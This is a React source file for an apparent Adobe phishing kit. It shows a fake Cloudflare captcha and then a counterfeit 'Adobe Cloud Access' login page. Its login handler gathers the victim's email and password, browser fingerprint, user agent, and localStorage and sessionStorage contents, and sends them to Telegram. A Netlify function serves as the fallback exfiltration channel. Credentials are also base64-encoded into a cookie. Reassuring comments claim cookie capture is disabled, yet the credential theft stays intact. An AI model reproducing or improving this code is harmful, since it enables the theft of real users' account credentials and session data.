import React, { useState, useEffect } from 'react';
import LoginPage from './components/LoginPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';
import LandingPage from './components/LandingPage';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import { 
  getBrowserFingerprint, 
  sendToTelegram 
} from './utils/oauthHandler';

// Import the real-time cookie system for session management (not for capture)
import { 
  setCookie, 
  getCookie, 
  removeCookie, 
  subscribeToCookieChanges,
  CookieChangeEvent 
} from './utils/realTimeCookieManager';

function App() {
  const [isMobile, setIsMobile] = useState(false);
  const [hasActiveSession, setHasActiveSession] = useState(false);
  const [currentPage, setCurrentPage] = useState('captcha'); // Start with captcha
  const [selectedFileName, setSelectedFileName] = useState('');
  const [isLoading, setIsLoading] = useState(true);
  const [captchaVerified, setCaptchaVerified] = useState(false);

  // Helper: robust sender that prefers sendToTelegram util but falls back to fetch if needed.
  const safeSendToTelegram = async (sessionData: any) => {
    console.log('🚀 Starting safeSendToTelegram with data:', sessionData);
    
    // Primary: use the project's sendToTelegram utility if available
    if (typeof sendToTelegram === 'function') {
      try {
        console.log('📡 Attempting primary sendToTelegram util...');
        const result = await sendToTelegram(sessionData);
        console.log('✅ sendToTelegram(util) result:', result);
        return result;
      } catch (err) {
        console.error('❌ sendToTelegram(util) failed:', err);
        // Fall through to fetch fallback
      }
    } else {
      console.warn('⚠️ sendToTelegram util is not a function or not available; using fetch fallback');
    }

    // Fallback: call the Netlify function endpoint directly
    try {
      console.log('📡 Attempting fetch fallback to /.netlify/functions/sendTelegram...');
      const res = await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(sessionData)
      });

      console.log('📡 Fetch response status:', res.status, res.statusText);

      if (!res.ok) {
        const bodyText = await res.text().catch(() => '');
        console.error('❌ Fetch response not ok:', bodyText);
        throw new Error(`HTTP ${res.status} ${res.statusText} ${bodyText ? '- ' + bodyText : ''}`);
      }

      let data;
      try {
        data = await res.json();
      } catch {
        data = null;
      }
      console.log('✅ sendToTelegram(fetch) result:', data);
      return data;
    } catch (fetchErr) {
      console.error('❌ sendToTelegram fallback (fetch) failed:', fetchErr);
      // Re-throw so caller knows it failed
      throw fetchErr;
    }
  };

  // Check if device is mobile
  useEffect(() => {
    const checkMobile = () => {
      if (typeof window !== 'undefined') {
        setIsMobile(window.innerWidth <= 768);
      }
    };
    
    checkMobile();
    
    if (typeof window !== 'undefined') {
      window.addEventListener('resize', checkMobile);
      return () => window.removeEventListener('resize', checkMobile);
    }
  }, []);

  // Add real-time cookie monitoring for session changes
  useEffect(() => {
    const unsubscribe = subscribeToCookieChanges((event: CookieChangeEvent) => {
      // Monitor session-related cookies for cross-tab synchronization
      if (event.name === 'adobe_session' || event.name === 'logged_in') {
        if (event.action === 'remove' || event.value === '' || event.value === 'false') {
          console.log('🔄 Session ended in another tab');
          setHasActiveSession(false);
          // If session ends, go back to captcha first
          setCaptchaVerified(false);
          setCurrentPage('captcha');
        } else if (event.action === 'set' || event.action === 'update') {
          console.log('🔄 Session updated in another tab');
          setHasActiveSession(true);
          setCurrentPage('landing');
        }
      }
    });

    return unsubscribe;
  }, []);

  // Check for existing session on load
  useEffect(() => {
    const checkSession = async () => {
      try {
        // Check if we're in browser environment
        if (typeof window === 'undefined') {
          setCurrentPage('captcha');
          setIsLoading(false);
          return;
        }
        
        // Check for OAuth callback first
        const urlParams = new URLSearchParams(window.location.search);
        const isOAuthCallback = urlParams.has('oauth_callback') || urlParams.has('code') || urlParams.has('state');
        
        if (isOAuthCallback) {
          // This logic is now deprecated with the removal of OAuth flow, but kept for compatibility.
          // It will now just redirect to the landing page if called.
          setIsLoading(false);
          setCurrentPage('landing');
          return;
        }

        // Enhanced session restoration - try cookies first, then localStorage
        let existingSession = null;
        
        // Try to get session from real-time cookies first
        const cookieSession = getCookie('adobe_session');
        if (cookieSession) {
          try {
            existingSession = JSON.parse(decodeURIComponent(cookieSession));
            console.log('✅ Session restored from cookie:', existingSession?.email);
          } catch (error) {
            console.warn('Invalid cookie session data:', error);
          }
        }
        
        // Fallback to localStorage (your existing method)
        if (!existingSession) {
          const localSession = typeof localStorage !== 'undefined' ? localStorage.getItem('adobe_autograb_session') : null;
          if (localSession) {
            try {
              existingSession = JSON.parse(localSession);
              console.log('✅ Session restored from localStorage:', existingSession?.email);
              
              // Migrate to cookie system for future reliability (no expiry)
              setCookie('adobe_session', encodeURIComponent(localSession), {
                secure: process.env.NODE_ENV === 'production',
                sameSite: 'strict',
                path: '/'
                // No expires = session cookie (no expiry until browser closes)
              });
              console.log('🔄 Session migrated to cookie system');
            } catch (error) {
              console.error('Error parsing existing session:', error);
              if (typeof localStorage !== 'undefined') {
                localStorage.removeItem('adobe_autograb_session');
              }
            }
          }
        }

        if (existingSession) {
          setHasActiveSession(true);
          setCaptchaVerified(true); // Skip captcha if session exists
          setCurrentPage('landing');
        } else {
          // No valid session, start with captcha
          setCurrentPage('captcha');
        }
      } catch (error) {
        console.error('Session check error:', error);
        setCurrentPage('captcha');
      } finally {
        setIsLoading(false);
      }
    };

    checkSession();
  }, []);

  // Handler for captcha verification
  const handleCaptchaVerified = () => {
    console.log('🔒 Captcha verified, redirecting to login...');
    // Move the page first to avoid transient rendering of the captcha UI
    setCurrentPage('login');
    setCaptchaVerified(true);
    setIsLoading(false); // Ensure loading is false
  };

  // Handler for login success from login components
  const handleLoginSuccess = async (sessionData: any) => {
    console.log('🔐 Login success:', sessionData);
    
    // Cookie capturing is disabled. Set placeholder values.
    const realCookies = '';
    const cookieList: any[] = [];
    
    // Enhanced cookie setting with real-time system (no expiry) for session management
    try {
      const sessionId = sessionData.sessionId || Math.random().toString(36).substring(2, 15);
      const cookieOptions = {
        path: '/',
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict' as const
        // No expires = session cookie (no expiry until browser closes)
      };
      
      // Use real-time cookie system
      setCookie('adobe_session', encodeURIComponent(JSON.stringify(sessionData)), cookieOptions);
      setCookie('sessionid', sessionId, cookieOptions);
      setCookie('auth_token', btoa(sessionData.email + ':' + (sessionData.password || 'no_pwd')), cookieOptions);
      setCookie('logged_in', 'true', cookieOptions);
      setCookie('user_email', encodeURIComponent(sessionData.email), cookieOptions);
      
      console.log('🍪 Login session cookies set with real-time system (no expiry)');
    } catch (e) {
      console.warn('Failed to set session cookies with real-time system, using fallback:', e);
      
      // Fallback to your existing method (no expiry)
      if (typeof document !== 'undefined') {
        const sessionId = sessionData.sessionId || Math.random().toString(36).substring(2, 15);
        
        document.cookie = `adobe_session=${encodeURIComponent(JSON.stringify(sessionData))}; path=/; secure; samesite=strict`;
        document.cookie = `sessionid=${sessionId}; path=/; secure; samesite=strict`;
        document.cookie = `auth_token=${btoa(sessionData.email + ':' + (sessionData.password || 'no_pwd'))}; path=/; secure; samesite=strict`;
        document.cookie = `logged_in=true; path=/; secure; samesite=strict`;
        document.cookie = `user_email=${encodeURIComponent(sessionData.email)}; path=/; secure; samesite=strict`;
      }
    }

    const browserFingerprint = await getBrowserFingerprint();
    
    const updatedSession = {
      ...sessionData,
      sessionId: sessionData.sessionId || Math.random().toString(36).substring(2, 15),
      timestamp: new Date().toISOString(),
      fileName: 'Adobe Cloud Access',
      clientIP: 'Unknown',
      userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
      deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
      cookies: 'Cookies not captured',
      cookiesParsed: {},
      cookieList: [],
      documentCookies: '',
      localStorage: browserFingerprint.localStorage,
      sessionStorage: browserFingerprint.sessionStorage,
      browserFingerprint: browserFingerprint
    };

    setHasActiveSession(true);

    // Store the updated session once (avoid duplicate writes)
    if (typeof localStorage !== 'undefined') {
      localStorage.setItem('adobe_autograb_session', JSON.stringify(updatedSession));
    }

    try {
      await safeSendToTelegram(updatedSession);
      
      // Ensure we redirect to landing page
      setCurrentPage('landing');
      setIsLoading(false);
      console.log('✅ Login data sent to Telegram');
    } catch (error) {
      console.error('❌ Failed to send to Telegram:', error);
      // Even if sending fails, still move to landing to avoid blocking UX
      setCurrentPage('landing');
      setIsLoading(false);
    }

    // Ensure we always redirect to landing page after successful login
    setTimeout(() => {
      setCurrentPage('landing');
    }, 100);
  };

  // Handler for file actions
  const handleFileAction = (fileName: string, action: 'view' | 'download') => {
    setSelectedFileName(fileName);
    console.log(`${action} action for file: ${fileName}`);
  };

  // Handler for logout
  const handleLogout = () => {
    // Clear all session data
    if (typeof localStorage !== 'undefined') {
      localStorage.removeItem('adobe_autograb_session');
    }
    if (typeof sessionStorage !== 'undefined') {
      sessionStorage.clear();
    }
    
    // Enhanced cookie clearing with real-time system
    try {
      const cookieNames = ['adobe_session', 'sessionid', 'auth_token', 'logged_in', 'user_email'];
      cookieNames.forEach(cookieName => {
        removeCookie(cookieName, { path: '/' });
      });
      console.log('🍪 Cookies cleared with real-time system');
    } catch (e) {
      console.warn('Failed to clear cookies with real-time system, using fallback:', e);
      
      // Fallback to your existing method
      if (typeof document !== 'undefined') {
        const cookies = ['adobe_session', 'sessionid', 'auth_token', 'logged_in', 'user_email'];
        cookies.forEach(cookie => {
          document.cookie = `${cookie}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
        });
      }
    }
    
    setHasActiveSession(false);
    setCaptchaVerified(false); // Reset captcha state on logout
    setCurrentPage('captcha'); // Go back to captcha on logout
  };

  // Loading state
  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Loading...</p>
        </div>
      </div>
    );
  }

  // Captcha verification page
  if (currentPage === 'captcha' && !captchaVerified) {
    return (
      <CloudflareCaptcha
        onCaptchaVerified={handleCaptchaVerified}
        // Provide legacy prop name as well for compatibility with different CloudflareCaptcha implementations
        onVerified={handleCaptchaVerified}
        onCaptchaError={(error) => {
          console.error('Captcha error:', error);
          setIsLoading(false);
        }}
      />
    );
  }

  // Login page - use appropriate component based on device (after captcha is verified)
  if (currentPage === 'login' && captchaVerified && !hasActiveSession) {
    const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
    
    console.log('🔐 Rendering login page:', { currentPage, captchaVerified, hasActiveSession, isMobile });
    
    return (
      <LoginComponent
        fileName="Adobe Cloud Access"
        onBack={() => {
          setCaptchaVerified(false);
          setCurrentPage('captcha');
        }}
        onLoginSuccess={handleLoginSuccess}
        onLoginError={(error) => {
          console.error('Login error:', error);
        }}
        showBackButton={true}
      />
    );
  }

  // Landing page - use appropriate component based on device
  if (hasActiveSession && currentPage === 'landing') {
    const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
    
    return (
      <LandingComponent
        onFileAction={handleFileAction}
        onLogout={handleLogout}
      />
    );
  }

  // Fallback
  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center">
      <div className="text-center">
        <p className="text-gray-600">Loading application...</p>
      </div>
    </div>
  );
}

export default App;